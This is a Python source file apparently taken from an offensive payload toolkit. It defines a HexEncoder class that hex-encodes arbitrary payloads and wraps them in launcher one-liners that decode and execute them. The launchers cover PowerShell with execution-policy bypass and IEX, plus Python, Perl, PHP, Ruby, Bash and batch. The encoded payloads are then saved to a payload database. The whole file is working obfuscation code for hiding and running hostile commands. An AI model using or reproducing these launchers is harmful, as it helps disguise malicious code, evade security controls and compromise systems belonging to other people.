from lib.database import insert_payload
from lib.settings import UnacceptableExecType


class HexEncoder(object):

    """
    encode a payload into hex
    """

    payload_starts = {
        "powershell": "Powershell.exe -exec bypass IEX "
                      "(\"{}\"-split\"(..)\"|?{{$_}}|%{{[char][convert]::ToInt16($_,16)}})-join""",
        "python": "python -c 'exec(\"{}\".decode(\"hex\"))'",
        "perl": "perl -MString::HexConverter -e 'eval print hex_to_ascii(\"{}\");'",
        "php": "php -r '$hexString=\"{}\";exec(hex2bin($hexString));'",
        "ruby": "ruby -e \"eval(\\\"{}\\\".scan(/../).map{{ |x| x.hex.chr }}.join)\"",
        "bash": "STRING=$(echo \"{}\" | xxd -r -p);eval $STRING;",
        # same as base64 but with hex
        "batch": "Powershell.exe -exec bypass IEX "
                      "(\"{}\"-split\"(..)\"|?{{$_}}|%{{[char][convert]::ToInt16($_,16)}})-join"""
    }
    acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash", "batch")

    def __init__(self, payload_data, cursor):
        self.payload = payload_data["data"]["payload"]
        self.exec_type = payload_data["data"]["information"]["exec"]
        self.payload_type = payload_data["data"]["information"]["type"]
        self.cursor = cursor

    def encode(self):
        hexlify = lambda x: "".join([hex(ord(c))[2:].zfill(2) for c in x])
        encoded_payload = hexlify(self.payload)
        if self.exec_type in self.acceptable_exec_types:
            payload = self.payload_starts[self.exec_type]
        else:
            payload = ""
        if payload == "":
            raise UnacceptableExecType("{} cannot be encoded into hex".format(self.exec_type))
        payload = payload.format(encoded_payload)
        is_inserted = insert_payload(payload, self.payload_type, self.exec_type, self.cursor)
        return payload, is_inserted

